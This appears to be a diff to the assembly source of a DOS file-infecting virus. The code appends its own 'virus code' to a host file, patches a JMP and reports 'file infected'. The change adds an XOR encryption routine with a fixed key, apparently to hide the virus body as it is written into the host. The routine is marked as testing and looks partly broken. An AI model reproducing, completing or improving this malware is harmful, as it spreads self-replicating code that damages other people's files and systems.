@@ -157,13 +157,16 @@ MOVE_PTR_OK:
 sub ax, 3 ;length of a JMP instruction (E9 xx xx)
 mov word ptr[bp+wHostFileLength], ax ;save the length of the file (minus 3)
 lea si,bp+sPointerMoved
-call Printf
-mov ah,40h ;append virus code(write it !!)
+call PrintF
 mov bx, word ptr[bp+wHostFileHandle]
 lea dx, bp+START
 mov cx, offset END_OF_CODE-offset START; number of bytes to write, a zero value truncates/extends
 ; the file to the current file position
+;-------------------testing---------------
+call encrypt;encrypt virus file
+mov ah,40h ;append virus code(write it !!)
 int 21h
+call  encrypt;fix up the mess
 jc CLOSE_FILE
 lea si, bp+sFileInfected
 call Printf
@@ -283,6 +286,27 @@ NewDosISR ENDP
 
 
 
+Encrypt PROC
+;encrypt_val    dw     3200h 
+     push     cx
+     mov      cx,offset  virus_code+184 ;virus_size are 184
+     mov      si,offset virus_code     ;start encryption at data
+     mov      di,si
+     cld
 
+xor_loop:
 
+     lodsw
+     xor      ax,3200h           ;3200h is encryption key
+     stosw
+     dec      cx
+     jcxz     stoppa
+     jmp      xor_loop
+
+stoppa:
+
+     pop      cx
+     ret
+
+Encrypt ENDP
 
